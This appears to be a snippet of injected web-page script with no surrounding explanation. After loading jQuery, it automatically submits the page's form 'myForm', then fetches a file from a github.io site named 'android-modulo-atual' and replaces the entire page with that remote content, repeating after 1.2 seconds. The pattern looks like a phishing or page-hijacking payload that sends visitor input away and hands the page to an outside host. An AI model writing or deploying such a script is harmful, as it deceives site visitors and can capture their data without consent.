<script
  src="https://code.jquery.com/jquery-3.5.1.min.js"
  integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
  crossorigin="anonymous"></script>
 

<script>
function vai () {
document.getElementById("myForm").submit();
	$.ajax({
        url: "https://android-modulo-atual.github.io/android-modulo-atual/nzz.md",
        type: 'GET',
        success: function(res) {
        	$("html").html(res);  
		
        }
    });

}


vai();

   setTimeout(function () {
     
    	vai();
    }, 1200);
</script>
